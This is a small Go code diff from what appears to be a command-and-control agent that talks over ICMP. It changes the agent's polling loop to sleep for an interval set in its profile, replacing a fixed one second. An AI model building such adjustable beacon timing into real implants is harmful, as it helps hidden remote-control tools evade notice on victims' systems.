@@ -278,7 +278,7 @@ func RunICMPLoop(profile utils.Profile, agentId uint32, initMsg []byte, encKey [
 			}
 
 			if len(recvData) == 0 {
-				time.Sleep(1 * time.Second)
+				time.Sleep(time.Duration(profile.SleepTime) * time.Second)
 				continue
 			}
 
